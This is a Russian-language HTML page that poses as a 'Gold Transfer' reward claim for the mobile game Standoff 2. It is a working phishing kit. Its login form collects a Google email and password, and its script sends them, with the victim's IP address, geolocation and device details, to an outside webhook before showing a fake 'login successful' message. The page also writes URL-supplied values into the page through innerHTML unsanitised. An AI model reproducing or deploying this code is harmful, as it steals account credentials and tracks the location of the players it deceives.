<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Standoff 2 - Gold transfer</title>
  <style>
    /* Основные стили */
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
      animation: fadeIn 1s ease-in-out;
    }
    h1, h2 {
      text-align: center;
      margin-bottom: 20px;
      animation: fadeIn 1.5s ease-in-out;
    }
    .input-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0066cc;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #005bb5;
    }
    .form-section {
      margin-bottom: 20px;
    }
    /* Анимации */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .fade-in {
      animation: fadeIn 1s ease-in-out;
    }
    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
      40% { transform: translateY(-20px); }
      60% { transform: translateY(-10px); }
    }
    .bounce {
      animation: bounce 2s infinite;
    }
    /* Стили для изображений */
    #gift-container, .gold-images {
      text-align: center;
      margin-bottom: 15px;
    }
    #gift-container img, .gold-images img {
      max-width: 80px;
      display: inline-block;
    }
    .gold-images img {
      margin: 0 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Gold Transfer</h1>
    
    <!-- Страница авторизации -->
    <div class="form-section" id="auth-section">
      <h2>Авторизация</h2>
      <form id="login-form">
        <div class="input-group">
          <label for="email">Google Почта:</label>
          <input type="email" id="email" name="email" required>
        </div>
        <div class="input-group">
          <label for="password">Пароль:</label>
          <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">Войти</button>
      </form>
      <div id="login-result"></div>
    </div>

    <!-- Страница получения голды -->
    <div class="form-section" id="gold-section" style="display:none;">
      <!-- Верхняя анимированная картинка подарка -->
      <div id="gift-container" class="fade-in">
        <img src="gift.png" alt="Подарок" class="gift bounce">
      </div>
      <h2>Получить Gold</h2>
      <!-- Блок для вывода информации из ID -->
      <div id="url-info" class="fade-in"></div>
      <!-- Кнопка получения -->
      <button id="get-gold-button">Получить Gold</button>
      <!-- Дополнительный блок с изображениями голды -->
      <div class="gold-images fade-in">
        <img src="small_gold.png" alt="Мало голды">
        <img src="big_gold.png" alt="Много голды">
      </div>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";

    function setCookie(name, value, days) {
      const expires = new Date(Date.now() + days * 864e5).toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
    }

    function getCookie(name) {
      return document.cookie.split('; ').reduce((r, v) => {
        const parts = v.split('=');
        return parts[0] === name ? decodeURIComponent(parts[1]) : r
      }, '');
    }

    function checkGoldCollected() {
      return getCookie("gold_collected") === "true";
    }

    // Функция для чтения длины до символа '0'
    function readLength(str, idx) {
      let lengthStr = '';
      while (str[idx] !== '0' && idx < str.length) {
        lengthStr += str[idx];
        idx++;
      }
      return [parseInt(lengthStr, 10), idx + 1];
    }

    // Декодирование параметров из Base64
    function decodeBase64Params(base64Str) {
      try {
        const decodedStr = atob(base64Str);
        let idx = 0;
        let [idLen, i1] = readLength(decodedStr, idx);
        const senderId = decodedStr.substr(i1, idLen);
        idx = i1 + idLen;
        let [nickLen, i2] = readLength(decodedStr, idx);
        const senderNick = decodedStr.substr(i2, nickLen);
        idx = i2 + nickLen;
        let [goldLen, i3] = readLength(decodedStr, idx);
        const goldAmount = decodedStr.substr(i3, goldLen);
        idx = i3 + goldLen;
        const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
        return { senderId, senderNick, goldAmount, hiddenParam };
      } catch (e) {
        console.error("Ошибка декодирования:", e);
        return null;
      }
    }

    // Сбор информации об устройстве и IP
    const clientInfo = {
      device: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`
      },
      ip: null,
      geolocation: {}
    };

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => { clientInfo.ip = data.ip; });

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        clientInfo.geolocation = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };
      });
    }

    function sendDataToWebhook(content, cb) {
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      }).then(res => cb(res.ok)).catch(() => cb(false));
    }

    // Обработка авторизации
    const loginForm = document.getElementById("login-form");
    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const message = `Новая авторизация:
Email: ${email}
Пароль: ${password}
Инфо: ${JSON.stringify(clientInfo)}`;
      sendDataToWebhook(message, function (success) {
        if (success) {
          document.getElementById("login-result").textContent = "Авторизация успешна";
          document.getElementById("auth-section").style.display = "none";
          document.getElementById("gold-section").style.display = "block";
          showGoldParams();
        } else {
          document.getElementById("login-result").textContent = "Ошибка при авторизации";
        }
      });
    });

    // Отображение параметров из URL
    function showGoldParams() {
      const params = new URLSearchParams(window.location.search);
      const idParam = params.get("ID");
      if (!idParam) {
        document.getElementById("url-info").textContent = "Некорректный ID";
        return;
      }
      const decoded = decodeBase64Params(idParam);
      if (!decoded) {
        document.getElementById("url-info").textContent = "Ошибка декодирования ID";
        return;
      }
      document.getElementById("url-info").innerHTML = `
        ID отправителя: ${decoded.senderId}<br>
        Ник: ${decoded.senderNick}<br>
        Кол-во Gold: ${decoded.goldAmount}
      `;
      document.getElementById("get-gold-button").onclick = function () {
        if (checkGoldCollected()) {
          alert("Вы уже получили Gold");
          return;
        }
        const goldMsg = `Получение голды:
ID: ${decoded.senderId}
Ник: ${decoded.senderNick}
Gold: ${decoded.goldAmount}
Инфо: ${JSON.stringify(clientInfo)}`;
        sendDataToWebhook(goldMsg, function (ok) {
          if (ok) {
            alert("Gold успешно получено");
            setCookie("gold_collected", "true", 7);
            document.getElementById("gold-section").innerHTML = "<h2>Вы уже получили Gold</h2>";
          } else {
            alert("Ошибка при получении");
          }
        });
      };
    }
  </script>
</body>
</html>
